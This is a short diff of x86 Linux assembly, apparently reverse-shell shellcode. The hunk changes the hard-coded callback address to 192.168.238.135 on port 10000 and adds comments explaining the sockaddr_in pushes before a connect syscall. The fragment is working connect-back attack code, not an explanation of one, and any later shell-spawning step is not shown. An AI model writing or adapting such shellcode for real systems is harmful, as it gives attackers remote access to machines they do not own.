@@ -17,11 +17,11 @@ xor eax,eax
 mov ebx,edi
 push eax
 push eax
-push word 0x8BEE
-push word 0xA8C0
-push word 0x1027
-mov ax,2
-push ax
+push word 0x87EE ; pushed 238.135
+push word 0xA8C0 ; pushed 192.168
+
+push word 0x1027 ;pushed port number htons(10000)
+push word 0x2 ; pushed AF_INET
 mov ecx, esp
 mov dl, 16
 mov eax,362
